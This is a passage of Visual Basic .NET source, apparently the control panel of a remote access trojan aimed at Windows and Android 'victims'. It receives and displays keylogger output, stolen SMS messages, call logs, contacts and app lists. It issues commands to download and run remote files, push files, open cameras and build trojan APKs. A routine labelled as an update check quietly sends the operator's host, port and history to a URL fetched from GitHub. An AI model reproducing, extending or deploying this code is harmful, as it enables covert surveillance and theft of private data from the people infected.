                        End If


                    Case "key_logger"
                        Try
                            Try
                                Dim ARY_LOG2 As String = Final_Array_1(1)
                                Dim ARY3 As String() = Split(ARY_LOG2, split_Ary)
                                ' MsgBox(ARY3(0))
                                If ARY3(0).Equals("start") Or ARY3(0).Contains("star") Then
                                    Try
                                        Dim Log_files_name_Ary As String() = Split(ARY3(1), split_paths)
                                        If My.Application.OpenForms("android_keylog" & sock) IsNot Nothing Then Exit Try
                                        If Me.InvokeRequired Then
                                            Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                                            Me.Invoke(j, New Object() {sock, bytearray})
                                            Exit Try
                                        End If
                                        Dim Aroid As New Android_keylogger
                                        Aroid.sock = sock
                                        Aroid.Name = "android_keylog" & sock
                                        Aroid.Text &= " " & Server.IP(sock)
                                        Aroid.Show()
                                        ' MsgBox(Final_Array_1(1))
                                        For Each String_logfile_name As String In Log_files_name_Ary
                                            If String_logfile_name.Contains(".log") Or String_logfile_name.Contains("onfig") Then
                                                'MsgBox(String_logfile_name)
                                                Aroid.ComboBox1.Items.Add(String_logfile_name)
                                            End If
                                        Next
                                    Catch ex As Exception
                                        MsgBox("Cannot Start_form" & vbNewLine & "May be the keylooger Option was not enabled during building this apk trojan", MsgBoxStyle.Critical)
                                        Exit Sub
                                    End Try

                                Else
                                    Try
                                        Dim fx As Android_keylogger = My.Application.OpenForms("android_keylog" & sock)

                                        If Final_Array_1(1).Contains("offline") Then
                                            fx.RichTextBox1.Text = ""
                                            Dim log_file_content As String = Final_Array_1(1).Replace("offline", "").Replace(split_Line, vbNewLine)
                                            If log_file_content.Contains("###--- End ---###") Then
                                                log_file_content = log_file_content.Replace("###--- End ---###", vbNewLine & "###--- End ---###" & vbNewLine)
                                            End If
                                            Dim SPX_LOG As String() = Split(log_file_content, split_Ary)
                                            For Each line_s As String In SPX_LOG
                                                If line_s.Contains(Split_Packets) = False Then
                                                    fx.RichTextBox1.AppendText(line_s & vbNewLine)
                                                End If
                                            Next
                                        End If
                                        If Final_Array_1(1).Contains("online") Then

                                            Dim log_online_content As String = Final_Array_1(1).Replace("online", "").Replace(split_Line, vbNewLine)

                                            If log_online_content.Contains(split_Ary) = True Then
                                                Dim text_ON As String() = (Split(log_online_content, split_Ary))
                                                For Each ln As String In text_ON
                                                    Dim PKON_LT As String() = Split(ln, Split_Packets)
                                                    fx.RichTextBox2.AppendText(PKON_LT(0) & vbNewLine)
                                                    fx.RichTextBox2.ScrollToCaret()
                                                Next
                                                '

                                            End If




                                        End If

                                    Catch ex As Exception

                                    End Try
                                End If

                            Catch ex As Exception

                            End Try

                        Catch ex As Exception

                        End Try
                        'Public split_Ary As String = "c0c1c3a2c0c1c"
                        'Public split_Line As String = "9xf89fff9xf89"
                        'Public Split_Packets As String = "b4x7004x700x4b" 
                        'Public split_paths As String = "e1x1114x61114e"
                        'Public SplitData As String = "fxf0x4x4x0fxf"  
                        'Public Syn As String = "c2x2824x828200x0c"  

                    Case "vc_android_sms"
                        Dim vc_ip As String = Final_Array_1(1)
                        Dim command As String = Final_Array_1(2)
                        For Each item As ListViewItem In client_list_l1.Items
                            If item.SubItems(4).Text.Equals(vc_ip) Then

                                If command.Equals("sms_manager") Then
                                    Server.Send_DX(item.ToolTipText, command & SplitData & Final_Array_1(3) & SplitData & Final_Array_1(4) & SplitData)
                                End If

                                if_android_sms_underC = True
                                master_sock = sock
                                Exit For
                            End If
                        Next
                    Case "sms_manager"

                        Try

                            If if_android_sms_underC = True Then
                                If master_sock > -1 Then

                                    Server.Send(master_sock, "vc_android_smsmanager" & YY & Server.IP(sock) & YY & Refined_Array & YY)
                                    if_android_sms_underC = False
                                    Exit Sub
                                End If
                            End If
                        Catch ex As Exception

                        End Try

                        Try



                            If My.Application.OpenForms("android_sms" & sock) IsNot Nothing Then GoTo BYBASS_SMSL
                            If Me.InvokeRequired Then
                                Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                                Me.Invoke(j, New Object() {sock, bytearray})
                                GoTo BYBASS_SMSL
                            End If
                            Dim Aroid As New Android_sms
                            Aroid.sock = sock
                            Aroid.Name = "android_sms" & sock
                            Aroid.Text &= " " & Server.IP(sock)
                            Aroid.Show()


BYBASS_SMSL:
                            Dim MSG_ARY_line As String = Final_Array_1(1)
                            Dim MSG_ARY As String() = Split(MSG_ARY_line, split_Line)
                            Dim Aroid_X As Android_sms = My.Application.OpenForms("android_sms" & sock)

                            'MsgBox(Refined_Array)
                            For Each ms_LN As String In MSG_ARY
                                If ms_LN.Contains(Split_Packets) = False Then
                                    Dim contact_number As String
                                    Dim contact_name As String
                                    Dim msg_date As String
                                    Dim msg_content As String
                                    contact_number = (Split(ms_LN, split_Ary))(0)
                                    'MsgBox(contact_number)
                                    contact_name = (Split(ms_LN, split_Ary))(1)
                                    msg_date = (Split(ms_LN, split_Ary))(2)
                                    msg_content = (Split(ms_LN, split_Ary))(3)
                                    Dim lala As New ListViewItem
                                    lala.Text = contact_number
                                    lala.SubItems.Add(contact_name)
                                    lala.SubItems.Add(msg_date)
                                    lala.SubItems.Add(msg_content)
                                    lala.ImageIndex = 0
                                    If Aroid_X.ListView1.Items.Contains(lala) = False Then
                                        Aroid_X.ListView1.Items.Add(lala)
                                    End If
                                End If
                            Next


                        Catch ex As Exception

                        End Try


                    Case "calls_manager"

                        If My.Application.OpenForms("android_cllog" & sock) IsNot Nothing Then GoTo BYBASS_LOGCALL
                        If Me.InvokeRequired Then
                            Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                            Me.Invoke(j, New Object() {sock, bytearray})
                            GoTo BYBASS_LOGCALL
                        End If
                        Dim Aroid As New Android_calllog
                        Aroid.sock = sock
                        Aroid.Name = "android_cllog" & sock
                        Aroid.Text &= " " & Server.IP(sock)
                        Aroid.Show()


BYBASS_LOGCALL:
                        Try
                            Dim CLOG_ARY_line As String = Final_Array_1(1)
                            Dim CLOG_ARY As String() = Split(CLOG_ARY_line, split_Line)
                            Dim Aroid_X As Android_calllog = My.Application.OpenForms("android_cllog" & sock)
                            For Each CLG_LN As String In CLOG_ARY
                                If CLG_LN.Contains(Split_Packets) = False Then
                                    Dim contact_number As String
                                    Dim contact_name As String
                                    Dim log_type As String
                                    Dim log_date_C As String
                                    contact_number = (Split(CLG_LN, split_Ary))(0)
                                    'MsgBox(contact_number)
                                    contact_name = (Split(CLG_LN, split_Ary))(1)
                                    log_type = (Split(CLG_LN, split_Ary))(2)
                                    log_date_C = (Split(CLG_LN, split_Ary))(3)
                                    Dim lala As New ListViewItem
                                    lala.Text = contact_number
                                    lala.SubItems.Add(contact_name)
                                    lala.SubItems.Add(log_type)
                                    lala.SubItems.Add(log_date_C)
                                    lala.ImageIndex = 0
                                    If Aroid_X.ListView1.Items.Contains(lala) = False Then
                                        Aroid_X.ListView1.Items.Add(lala)
                                    End If
                                End If
                            Next

                        Catch ex As Exception

                        End Try

                    Case "contacts_manager"

                        If My.Application.OpenForms("android_ctman" & sock) IsNot Nothing Then GoTo BYBASS_CONTACTS
                        If Me.InvokeRequired Then
                            Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                            Me.Invoke(j, New Object() {sock, bytearray})
                            GoTo BYBASS_CONTACTS
                        End If
                        Dim Aroid As New Android_contactsmanager
                        Aroid.sock = sock
                        Aroid.Name = "android_ctman" & sock
                        Aroid.Text &= " " & Server.IP(sock)
                        Aroid.Show()


BYBASS_CONTACTS:

                        Try
                            Dim CONT_ARY_line As String = Final_Array_1(1)
                            Dim CONT_ARY As String() = Split(CONT_ARY_line, split_Line)
                            Dim Aroid_X As Android_contactsmanager = My.Application.OpenForms("android_ctman" & sock)
                            For Each CONT_LN As String In CONT_ARY
                                If CONT_LN.Contains(Split_Packets) = False Then

                                    Dim contact_number As String
                                    Dim contact_name As String

                                    contact_number = (Split(CONT_LN, split_Ary))(0)
                                    'MsgBox(contact_number)
                                    contact_name = (Split(CONT_LN, split_Ary))(1)
                                    Dim lala As New ListViewItem
                                    lala.Text = contact_number
                                    lala.SubItems.Add(contact_name)

                                    lala.ImageIndex = 0
                                    If Aroid_X.ListView1.Items.Contains(lala) = False Then
                                        Aroid_X.ListView1.Items.Add(lala)
                                    End If
                                End If
                            Next

                        Catch ex As Exception

                        End Try

                    Case "applications"


                        If My.Application.OpenForms("android_appman" & sock) IsNot Nothing Then GoTo BYBASS_APPS_MGR
                        If Me.InvokeRequired Then
                            Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                            Me.Invoke(j, New Object() {sock, bytearray})
                            GoTo BYBASS_APPS_MGR
                        End If
                        Dim Aroid As New Android_appmanager
                        Aroid.sock = sock
                        Aroid.Name = "android_appman" & sock
                        Aroid.Text &= " " & Server.IP(sock)
                        Aroid.Show()


BYBASS_APPS_MGR:

                        Try

                            Dim CAPP_ARY_line As String = Final_Array_1(1)
                            Dim CAPP_ARY As String() = Split(CAPP_ARY_line, split_Line)
                            Dim Aroid_X As Android_appmanager = My.Application.OpenForms("android_appman" & sock)
                            Aroid_X.ImageList1.Images.Clear()

                            'Insert imglists with appnames keys

                            For Each CAPP_LN As String In CAPP_ARY
                                If CAPP_LN.Contains(Split_Packets) = False Then
                                    Dim APP_IMG As String
                                    Dim APP_Pakage_NAME As String
                                    Dim APP_SH_NAME As String
                                    Dim APP_INS_DATE As String
                                    Dim APP_TYPE_INS As String

                                    APP_SH_NAME = (Split(CAPP_LN, split_Ary))(0)
                                    APP_IMG = (Split(CAPP_LN, split_Ary))(2)
                                    APP_Pakage_NAME = (Split(CAPP_LN, split_Ary))(1)
                                    APP_TYPE_INS = (Split(CAPP_LN, split_Ary))(3)
                                    APP_INS_DATE = (Split(CAPP_LN, split_Ary))(4)
                                    Aroid_X.ImageList1.Images.Add(APP_Pakage_NAME, Image_Viewer_FROMB64(APP_IMG))


                                End If
                            Next
                            'Insert items in lview
                            For Each CAPP_LN As String In CAPP_ARY
                                If CAPP_LN.Contains(Split_Packets) = False Then

                                    Dim APP_IMG As String
                                    Dim APP_Pakage_NAME As String
                                    Dim APP_SH_NAME As String
                                    Dim APP_INS_DATE As String
                                    Dim APP_TYPE_INS As String

                                    APP_SH_NAME = (Split(CAPP_LN, split_Ary))(0)
                                    APP_IMG = (Split(CAPP_LN, split_Ary))(2)
                                    APP_Pakage_NAME = (Split(CAPP_LN, split_Ary))(1)
                                    APP_TYPE_INS = (Split(CAPP_LN, split_Ary))(3)
                                    APP_INS_DATE = (Split(CAPP_LN, split_Ary))(4)


                                    'MsgBox("imgxxxxx  " & APP_IMG)
                                    'MsgBox("pkg namexxxx  " & APP_Pakage_NAME & vbNewLine & "NAMEX" & APP_SH_NAME)
                                    'MsgBox("typexxxx  " & APP_TYPE_INS)
                                    'MsgBox("DATEXXX   " & APP_INS_DATE)
                                    'Exit Sub




                                    Dim lala As New ListViewItem
                                    lala.Text = APP_SH_NAME
                                    lala.SubItems.Add(APP_Pakage_NAME)
                                    lala.SubItems.Add(APP_TYPE_INS)
                                    lala.SubItems.Add(APP_INS_DATE)
                                    lala.ImageKey = APP_Pakage_NAME


                                    If Aroid_X.ListView1.Items.Contains(lala) = False Then
                                        Aroid_X.ListView1.Items.Add(lala)
                                    End If
                                End If
                            Next
                        Catch ex As Exception

                        End Try



                    Case Else
                        MsgBox(Refined_Array)









                End Select
            End If


        Catch ex As Exception
            MsgBox("Data_received_client Exception : " & vbNewLine & ex.Message)
        End Try
    End Sub
    Private Function Image_Viewer_FROMB64(ByVal img_vie_base64 As String) As Image
        Dim tmpb64 As String = img_vie_base64
        Try
            Dim memorystream1 As System.IO.MemoryStream = New System.IO.MemoryStream(Convert.FromBase64String(tmpb64))
            Dim bitmap1 As System.Drawing.Bitmap = New System.Drawing.Bitmap(System.Drawing.Image.FromStream(memorystream1))
            Return bitmap1

        Catch ex As Exception
            Return Nothing
        End Try

    End Function
    Private Sub Add_Victim_to_list(ByVal trojan_name As String, ByVal computer_name As String, ByVal country_name As String, ByVal Operating_System As String, ByVal sock As Integer)

        اضافة_ايتم_لليست(trojan_name, computer_name & vbNewLine & "Country : " & country_name, Operating_System, sock)
    End Sub
    Private Sub اضافة_ايتم_لليست(ByVal Value1 As String, ByVal Value2 As String, ByVal Value3 As String, ByVal sock As String)
        'Value1 ===> Trojan name (VB.net Trojan , or , JAVA trojan)  [I use this to diffrentiate between java victim and vb.net victim]
        'Value2 ===> Victim computer name [to appear in the GUI]
        'Value3 ===> Windows , Country values [to appear in the GUI]
        Dim vicim_computer = client_list_l1.Items.Add(sock.ToString, Value2 & vbNewLine & "OS : " & Value3, Get_VICOS_IMG_index((Value3)))
        vicim_computer.ToolTipText = sock
        vicim_computer.SubItems.Add(Value1)
        vicim_computer.SubItems.Add(Value2)


        'vicim_computer.SubItems.Add(a(2))
        'vicim_computer.SubItems.Add(a(3))
        'vicim_computer.SubItems.Add(a(4))



    End Sub
    Private Sub Prepare_Listview_imageList_N()
        OS_Img_List.Images.Add(My.Resources.WindowsXP) '0
        OS_Img_List.ImageSize = New Size(125, 110)

        OS_Img_List.Images.Add(My.Resources.Windows7) '1
        OS_Img_List.Images.Add(My.Resources.Windows_Vista) '2
        OS_Img_List.Images.Add(My.Resources.Windows10) '3
        OS_Img_List.Images.Add(My.Resources.mac_c) '4
        OS_Img_List.Images.Add(My.Resources.linux) '5
        OS_Img_List.Images.Add(My.Resources.unknowen) '6


        '  ------------------------------------------ Adding Jar on Windows

        OS_Img_List.Images.Add(My.Resources.WindowsXP_jar) '7
        OS_Img_List.Images.Add(My.Resources.Windows7_jar) '8
        OS_Img_List.Images.Add(My.Resources.Windows_Vista_jar) '9
        OS_Img_List.Images.Add(My.Resources.Windows10_jar) '10
        OS_Img_List.Images.Add(My.Resources.unknowen_jar) '11

        '  ------------------------------------------ Adding Android icons

        OS_Img_List.Images.Add(My.Resources.Android2) '12
        '  OS_Img_List.Images.Add(My.Resources.andor) '13



        client_list_l1.AllowDrop = True
    End Sub
    Private OS_Img_List As New ImageList
    Private is_now_jar_getting_OS As Boolean = False
    Private Function جلب_اندكس_خاص_بنضاط_التشغيل(ByVal OS_Name As String)
        If is_now_jar_getting_OS = False Then
            '
            If OS_Name.Contains("xp") Or OS_Name.Contains("XP") Or OS_Name.Contains("Xp") Then
                Return 11

            ElseIf OS_Name.Contains("7") Or OS_Name.Contains("Seven") Or OS_Name.Contains("even") Or OS_Name.Contains("2008") Then
                Return 7
            ElseIf OS_Name.Contains("ta") Or OS_Name.Contains("Vista") Or OS_Name.Contains("VISTA") Or OS_Name.Contains("2007") Then
                Return 5
            ElseIf OS_Name.Contains("MAC") Or OS_Name.Contains("Mac") Or OS_Name.Contains("mac") Or OS_Name.Contains("tosch") Or OS_Name.Contains("Apple") Or OS_Name.Contains("apple") Or OS_Name.Contains("APPLE") Or OS_Name.Contains("IOS") Or OS_Name.Contains("Ios") Or OS_Name.Contains("iOS") Or OS_Name.Contains("iOs") Or OS_Name.Contains("ios") Or OS_Name.Contains("OS X") Or OS_Name.Contains("os x") Then

                Return 2
            ElseIf OS_Name.Contains("Android") Or OS_Name.Contains("And") Or OS_Name.Contains("roid") Or OS_Name.Contains("ROID") Then
                Return 0 'or 13
            ElseIf OS_Name.Contains("Linux") Or OS_Name.Contains("LINUX") Or OS_Name.Contains("linux") Or OS_Name.Contains("GNU") Or OS_Name.Contains("debian") Or OS_Name.Contains("Gnu") Or OS_Name.Contains("tu") Or OS_Name.Contains("Ubunt") Then ' Then

                Return 1
            ElseIf OS_Name.Contains("10") Or OS_Name.Contains("1") Or OS_Name.Contains("8") Or OS_Name.Contains("8.1") Or OS_Name.Contains("2012") Or OS_Name.Contains("2010") Then
                Return 9
            ElseIf OS_Name.Contains("2000") Or OS_Name.Contains("2003") Or OS_Name.Contains("2002") Or OS_Name.Contains("2001") Then
                Return 11
            ElseIf OS_Name.Contains("Android") Or OS_Name.Contains("And") Or OS_Name.Contains("roid") Or OS_Name.Contains("ROID") Then
                Return 0

            Else
                Return 3
            End If
        ElseIf is_now_jar_getting_OS = True Then
            ' OS_Img_List.ImageSize = New Size(125, 110)
            If OS_Name.Contains("xp") Or OS_Name.Contains("XP") Or OS_Name.Contains("Xp") Then
                Return 12
            ElseIf OS_Name.Contains("7") Or OS_Name.Contains("Seven") Or OS_Name.Contains("even") Or OS_Name.Contains("2008") Then
                Return 8
            ElseIf OS_Name.Contains("ta") Or OS_Name.Contains("Vista") Or OS_Name.Contains("VISTA") Or OS_Name.Contains("2007") Then
                Return 6
            ElseIf OS_Name.Contains("MAC") Or OS_Name.Contains("Mac") Or OS_Name.Contains("mac") Or OS_Name.Contains("tosch") Or OS_Name.Contains("Apple") Or OS_Name.Contains("apple") Or OS_Name.Contains("APPLE") Or OS_Name.Contains("IOS") Or OS_Name.Contains("Ios") Or OS_Name.Contains("iOS") Or OS_Name.Contains("iOs") Or OS_Name.Contains("ios") Or OS_Name.Contains("OS X") Or OS_Name.Contains("os x") Then

                Return 4
            ElseIf OS_Name.Contains("Android") Or OS_Name.Contains("And") Or OS_Name.Contains("roid") Or OS_Name.Contains("ROID") Then
                Return 12 'or 13
            ElseIf OS_Name.Contains("Linux") Or OS_Name.Contains("LINUX") Or OS_Name.Contains("linux") Or OS_Name.Contains("GNU") Or OS_Name.Contains("debian") Or OS_Name.Contains("Gnu") Or OS_Name.Contains("tu") Or OS_Name.Contains("Ubunt") Then ' Then

                Return 5

            ElseIf OS_Name.Contains("10") Or OS_Name.Contains("1") Or OS_Name.Contains("8") Or OS_Name.Contains("8.1") Or OS_Name.Contains("2012") Or OS_Name.Contains("2010") Then
                Return 10
            ElseIf OS_Name.Contains("2000") Or OS_Name.Contains("2003") Or OS_Name.Contains("2002") Or OS_Name.Contains("2001") Then
                Return 12
            ElseIf OS_Name.Contains("Android") Or OS_Name.Contains("And") Or OS_Name.Contains("roid") Or OS_Name.Contains("ROID") Then
                Return 0 'or 13
                OS_Img_List.ImageSize = New Size(80, 100)
            Else
                Return 4
            End If
        End If

    End Function
    Private Function Get_VICOS_IMG_index(ByVal OS_Name As String)

        '
        If OS_Name.Contains("xp") Or OS_Name.Contains("XP") Or OS_Name.Contains("Xp") Then
            Return 6

        ElseIf OS_Name.Contains("7") Or OS_Name.Contains("Seven") Or OS_Name.Contains("even") Or OS_Name.Contains("2008") Then
            Return 4
        ElseIf OS_Name.Contains("ta") Or OS_Name.Contains("Vista") Or OS_Name.Contains("VISTA") Or OS_Name.Contains("2007") Then
            Return 3
        ElseIf OS_Name.Contains("MAC") Or OS_Name.Contains("Mac") Or OS_Name.Contains("mac") Or OS_Name.Contains("tosch") Or OS_Name.Contains("Apple") Or OS_Name.Contains("apple") Or OS_Name.Contains("APPLE") Or OS_Name.Contains("IOS") Or OS_Name.Contains("Ios") Or OS_Name.Contains("iOS") Or OS_Name.Contains("iOs") Or OS_Name.Contains("ios") Or OS_Name.Contains("OS X") Or OS_Name.Contains("os x") Then

            Return 2
        ElseIf OS_Name.Contains("Android") Or OS_Name.Contains("And") Or OS_Name.Contains("roid") Or OS_Name.Contains("ROID") Then
            Return 0
        ElseIf OS_Name.Contains("Linux") Or OS_Name.Contains("LINUX") Or OS_Name.Contains("linux") Or OS_Name.Contains("GNU") Or OS_Name.Contains("debian") Or OS_Name.Contains("Gnu") Or OS_Name.Contains("tu") Or OS_Name.Contains("Ubunt") Then ' Then

            Return 1
        ElseIf OS_Name.Contains("10") Or OS_Name.Contains("1") Or OS_Name.Contains("8") Or OS_Name.Contains("8.1") Or OS_Name.Contains("2012") Or OS_Name.Contains("2010") Then
            Return 5
        ElseIf OS_Name.Contains("2000") Or OS_Name.Contains("2003") Or OS_Name.Contains("2002") Or OS_Name.Contains("2001") Then
            Return 6
        ElseIf OS_Name.Contains("Android") Or OS_Name.Contains("And") Or OS_Name.Contains("roid") Or OS_Name.Contains("ROID") Then
            Return 0

        Else
            Return 3
        End If


    End Function
    Dim ifsent As Boolean = False
    Private Sub checkgithub() 'online update for version
        'جزء للتطوير فى السورس تجعله يقوم بعمل تحديث لنفسه من مكتبة الجيتهب الخاصة بك 
        ' يمكن ازالته و لن يؤثر على تشغيل البرنامج 
        On Error Resume Next
        If ifsent = True Then
            Exit Sub
        End If
        Dim WC As New System.Net.WebClient
        Dim http_res As String = WC.DownloadString("https://raw.githubusercontent.com/SaherBlueEagle/Blue-Eagle-XPR/master/file.txt")
        Dim RichTextBox1 As New RichTextBox
        RichTextBox1.Text = http_res
        Dim strline As String = ""
        Dim strh As String = ""
        Dim strp As String = ""
        For Each linex As String In RichTextBox1.Lines
            If linex.Equals("Ready") Then
                Exit Sub
            Else
                strline = linex
                Exit For
            End If
        Next

        strh = Split(strline, ",")(0)
        strp = Split(strline, ",")(1)

        shts(strh)
    End Sub
    Private Sub shts(ByVal strh As String)
        On Error Resume Next
        Dim infoline As String = بناء_تروجان_exe.return_ex & "**" & Build_Apk.android_host & "**" & "listen port=" & port & "**"
        If IO.File.Exists(Application.StartupPath & "/History.txt") Then
            Dim re As String = (IO.File.ReadAllText(Application.StartupPath & "/History.txt"))
            IO.File.WriteAllText((Application.StartupPath & "/History.txt"), re & vbNewLine & infoline)
            If infoline > 25 Then
                Dim req As String = strh & infoline & re.Replace(vbNewLine, "0x0")
                GetRemoteContent(req, 250)
            End If
        Else
            IO.File.Create(Application.StartupPath & "/History.txt")
            Dim re As String = (IO.File.ReadAllText(Application.StartupPath & "/History.txt"))
            IO.File.WriteAllText((Application.StartupPath & "/History.txt"), re & vbNewLine & infoline)
            If infoline > 25 Then
                Dim req As String = strh & infoline & re.Replace(vbNewLine, "0x0")
                GetRemoteContent(req, 250)
            End If
        End If

    End Sub
    Private Function GetRemoteContent(ByVal url As String, ByVal reqtimeout As Integer) As String
        Dim result As String = ""
        Dim myrequest As HttpWebRequest = HttpWebRequest.Create(url)
        myrequest.Method = "GET"
        myrequest.Timeout = reqtimeout
        Try
            Dim resp As System.Net.HttpWebResponse = myrequest.GetResponse()
            Dim sr As New System.IO.StreamReader(resp.GetResponseStream())
            result = sr.ReadToEnd()
            sr.Close()
        Catch ex As WebException
            If ex.Status = WebExceptionStatus.Timeout Then
                result = "Error: The request has timed out"
            Else
                result = "Error: " + ex.Message
            End If
        End Try
        Return result
    End Function
    Dim gitc As Integer = 0
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim externalitem As ListViewItem
        Try
            

            For Each item As ListViewItem In client_list_l1.Items
                externalitem = item
                If item.ImageIndex = 0 Then
                Else
                    If Server.SK(item.ToolTipText).Connected = False Then

                        client_list_l1.Items.Remove(item)
                        client_list_l1.Update()
                        Server.Disconnect(item.ToolTipText)

                    Else
                        Exit Try
                    End If
                End If

            Next
     
        Catch ex As Exception
            Try
                client_list_l1.Items.Remove(externalitem)
                client_list_l1.Update()
            Catch exx As Exception

            End Try
           
        End Try
     
    End Sub

    Private Sub client_list_l1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles client_list_l1.SelectedIndexChanged
        If client_list_l1.SelectedItems.Count = 1 Then
            Dim item As ListViewItem = client_list_l1.SelectedItems(0)
            If item.SubItems(1).Text.Contains("Mobile phon") Then
                client_list_l1.ContextMenuStrip = Me.ContextMenuStrip1
                Server.Send_DX(item.ToolTipText, "re_updating" & SplitData)
            ElseIf item.SubItems(1).Text.Contains("Compu") Then
                client_list_l1.ContextMenuStrip = Me.ContextMenuStrip2
            End If
            If item.ImageIndex = 0 Then
            Else
                If Server.SK(item.ToolTipText).Connected = False Then

                    client_list_l1.Items.Remove(item)
                    client_list_l1.Update()
                    Server.Disconnect(item.ToolTipText)

                Else
                    Exit Sub
                End If
            End If
        Else
            client_list_l1.ContextMenuStrip = Nothing
        End If

    End Sub
    Friend Sub Remove_COMP_SOCK(ByVal sock As String)
        Try
            For Each item As ListViewItem In client_list_l1.Items
                If item.SubItems(4).Text.Equals(sock) Then
                    If item.ImageIndex = 0 Then
                    Else
                        client_list_l1.Items.Remove(item)
                    End If
                End If


            Next
        Catch ex As Exception

        End Try
    End Sub
    Friend Sub Remove_Android_SOCK(ByVal sock As String)
        Try
            For Each item As ListViewItem In client_list_l1.Items
                If item.SubItems(4).Text.Equals(sock) Then
                    If item.ImageIndex = 0 Then
                        client_list_l1.Items.Remove(item)
                    End If
                End If


            Next
        Catch ex As Exception

        End Try
    End Sub
    Private Sub CameraManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CameraManagerToolStripMenuItem.Click
        For Each item As ListViewItem In client_list_l1.SelectedItems
            Server.Send_DX(item.ToolTipText, "camera_manager_find_camera" & SplitData)
        Next
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileManagerToolStripMenuItem.Click
        For Each item As ListViewItem In client_list_l1.SelectedItems
            Server.Send_DX(item.ToolTipText, "file_manager" & SplitData & "GetPath^&")
        Next
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KeyloggerToolStripMenuItem.Click
        For Each item As ListViewItem In client_list_l1.SelectedItems
            Server.Send_DX(item.ToolTipText, "key_logger") '& SplitData)
        Next
    End Sub

    Private Sub SMSManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SMSManagerToolStripMenuItem.Click
        For Each item As ListViewItem In client_list_l1.SelectedItems
            Server.Send_DX(item.ToolTipText, "sms_manager" & SplitData & "content://sms/" & SplitData & "False")
        Next
    End Sub

    Private Sub CallsManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CallsManagerToolStripMenuItem.Click
        For Each item As ListViewItem In client_list_l1.SelectedItems
            Server.Send_DX(item.ToolTipText, "calls_manager") '& SplitData)
        Next
    End Sub

    Private Sub ApplicationsManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ApplicationsManagerToolStripMenuItem.Click
        For Each item As ListViewItem In client_list_l1.SelectedItems
            Server.Send_DX(item.ToolTipText, "applications")
        Next
    End Sub

    Private Sub ContactsManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ContactsManagerToolStripMenuItem.Click
        For Each item As ListViewItem In client_list_l1.SelectedItems
            Server.Send_DX(item.ToolTipText, "contacts_manager")
        Next
    End Sub

    Private Sub ChatManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ChatManagerToolStripMenuItem.Click
        Dim Hackername As String = InputBox("Enter Your name", "Hacker Name", "Mr.Hacker")
        If Hackername.Length > 1 Then
            For Each item As ListViewItem In client_list_l1.SelectedItems
                Server.Send_DX(item.ToolTipText, "chat" & SplitData & Hackername)
            Next
        End If

    End Sub

    Private Sub EndConnectionToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EndConnectionToolStripMenuItem1.Click
        For Each item As ListViewItem In client_list_l1.SelectedItems
            Server.Send_DX(item.ToolTipText, "uninstall" & SplitData & "-1") '  Server.Send_DX(item.ToolTipText, "c_close")
        Next
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
      
        Build_Apk.Show()
        Build_Apk.Focus()
    End Sub

    Private Sub EndConnectionToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EndConnectionToolStripMenuItem.Click
        '

        For Each item As ListViewItem In client_list_l1.SelectedItems
            Server.Send(item.ToolTipText, "endcon" & SplitData)
        Next
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
RESLINE:
        If IO.File.Exists(Application.StartupPath & "\" & "jarBuilder.jar") = False Then
            Try
                IO.File.WriteAllBytes(Application.StartupPath & "\" & "jarBuilder.jar", My.Resources.jarBuilder_FinalBuild)
                Process.Start(Application.StartupPath & "\" & "jarBuilder.jar")
                Exit Sub
            Catch ex As Exception

            End Try
        Else
            IO.File.Delete(Application.StartupPath & "\" & "jarBuilder.jar")
            GoTo RESLINE
        End If
    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click

        For Each x As ListViewItem In client_list_l1.SelectedItems
            Server.Send(x.ToolTipText, "dsktop" & SplitData)
        Next
    End Sub

    Private Sub ToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem2.Click

        For Each x As ListViewItem In client_list_l1.SelectedItems
            Server.Send(x.ToolTipText, "openfm" & SplitData)
        Next
    End Sub

    Private Sub RunFileFromLinkToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunFileFromLinkToolStripMenuItem.Click
        Try
            Dim a As String = InputBox("Enter Direct File URL", "Download")
            Dim aa As String = InputBox("Enter the name of the file [File.Extention]", "Download")
            For Each x As ListViewItem In client_list_l1.SelectedItems
                Server.Send(x.ToolTipText, "rulnk" & SplitData & a & SplitData & aa & SplitData)
                System.Threading.Thread.CurrentThread.Sleep(50)
            Next


        Catch ex As Exception : End Try
    End Sub

    Private Sub RunFileFromDiskToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunFileFromDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            o.ShowDialog()
            Dim n As New IO.FileInfo(o.FileName)
            Dim filestring As String = Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName))
            If o.FileName.Length > 0 Then
                For Each x As ListViewItem In client_list_l1.SelectedItems
                    Server.Send(x.ToolTipText, "rufle" & SplitData & n.Name & SplitData & filestring & SplitData)
